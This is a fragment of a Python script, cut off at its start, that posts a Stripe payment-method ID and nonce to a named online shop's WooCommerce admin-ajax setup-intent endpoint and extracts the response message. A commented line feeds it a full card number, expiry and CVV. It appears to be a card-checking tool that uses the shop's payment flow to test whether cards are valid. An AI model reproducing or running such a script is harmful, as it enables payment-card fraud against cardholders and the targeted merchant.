    }
    
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': f'{pm}',
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': f'{ajax}',
    }
    
    response = session.post('https://www.escaperoomsupplier.com/wp-admin/admin-ajax.php', #cookies=cookies, 
    headers=headers, data=data)
    
    try:
        result = re.search(r'"message":"(.*?)"', response.text).group(1)
    except:
        result = re.search(r'"status":"(.*?)"', response.text).group(1)

    return result
    
#test_card = "5488093801213161|10|28|945"
#print(Tele(test_card))
